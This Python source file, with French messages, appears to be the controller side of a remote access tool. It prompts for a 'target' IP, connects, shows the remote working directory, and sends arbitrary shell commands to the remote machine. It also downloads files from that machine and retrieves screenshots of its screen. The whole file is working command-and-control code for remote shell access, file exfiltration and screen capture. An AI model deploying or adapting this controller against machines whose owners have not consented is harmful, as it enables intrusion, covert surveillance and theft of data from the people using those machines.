from base import *
from spliter import commande_spliter


def file_already_exist(file_name: str):
    try:
        file = open(file_name, 'r')
    except FileNotFoundError:
        return False
    except IsADirectoryError:
        return 'isdir'
    else:
        file.close()
        return True


async def download_file_localy(sock: socket, commande: str, destination: str) -> None:
    splited_commande = commande_spliter(commande)
    error = False

    if destination.lower() == 'q':
        print("‼️Le fichier n'a pas ete telecharger.")

    else:
        if file_already_exist(destination) == 'isdir':
            print(f"‼️ {destination} est un dossier.")
            error = True

        elif file_already_exist(destination):
            print(f'‼️ Le fichier {destination} existe dejas')
            error = True

        else:
            # Tell the server to send the file in the commande
            await send_header_and_data(sock, commande.encode(encoding=ENCODING))

            # Receiving the file or ('filenotfound' | 'isdir' | 'screenshot-error')
            output = await recv_header_and_data(sock, show_progress=True)

            if output == 'filenotfound'.encode(encoding=ENCODING):
                # The file doesn't exist on the server
                print("‼️ Le fichier n'existe pas.")
            elif output == 'isdir'.encode(encoding=ENCODING):
                # The file name specified is a directory
                print("‼️ Ne peut pas telecharger un dossier.")
            elif output == 'screenshot-error'.encode(encoding=ENCODING):
                # Error for screenshot commande
                print(f"‼️ Impossibe d'effectuer une capture d'ecran.")
            else:
                # The file is received successfully
                # Write the file to the destination
                with open(destination, 'wb') as f:
                    f.write(output)
                print(f'Telechargement de {splited_commande[1]} dans {destination}\n')

        if error:
            new_destination = input('Entrez un nouvelle destination (ou "q" pour quitter): ')
            await download_file_localy(sock, commande, new_destination)


async def screenshot(sock: socket, commande: str, destination: str):
    splited_commande = commande_spliter(commande)
    if len(splited_commande) < 3:
        splited_commande.insert(1, '.screenshoot.png')
    new_commande = " ".join(splited_commande)
    await download_file_localy(sock, new_commande, destination)


class Client(ClientSocket):

    def __init__(self):
        super().__init__()

    async def run(self):
        while True:
            await send_header_and_data(self.clientsocket, 'info'.encode(encoding=ENCODING))
            cwd = await recv_header_and_data(self.clientsocket)
            cwd = cwd.decode(encoding=ENCODING)
            prompt = f'╭─ {self.serveraddress[0]}: {self.serveraddress[1]} {cwd}\n╰─ ❯ '

            commande = ''
            while commande == '':
                commande = input(prompt)
            if commande.lower() == 'exit':
                await send_header_and_data(self.clientsocket, commande.lower().encode(encoding=ENCODING))
                break

            try:
                splited_commande = commande_spliter(commande)
            except:
                print('‼️ Mauvaise commande')
            else:
                if len(splited_commande) == 3 and splited_commande[0] == 'download':
                    await download_file_localy(self.clientsocket, " ".join(splited_commande[:2]), splited_commande[2])

                elif len(splited_commande) == 2 and splited_commande[0] == 'capture':
                    await screenshot(self.clientsocket, splited_commande[0], splited_commande[1])

                else:
                    await send_header_and_data(self.clientsocket, commande.encode(encoding=ENCODING))
                    output = await recv_header_and_data(self.clientsocket)
                    print(output.decode(encoding=ENCODING))

        print(f'\n‼️ Deconnecte\n')
        self.clientsocket.close()


async def main():
    client = Client()
    target_ip = input("Entrez l'addresse IP du cible: ")
    client.connect(target_ip)
    await client.run()


if __name__ == '__main__':
    asyncio.run(main())
